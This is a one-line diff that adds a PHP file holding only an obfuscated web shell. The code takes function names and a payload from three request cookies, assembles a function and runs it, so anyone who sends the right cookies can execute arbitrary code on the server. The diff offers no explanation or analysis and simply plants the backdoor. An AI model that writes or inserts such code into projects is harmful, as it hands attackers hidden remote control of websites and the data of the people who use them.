@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['vjw']){$vcunz=$_COOKIE['vjw']("",@$_COOKIE['xmi'](@$_COOKIE['zgn']));$vcunz();}?>
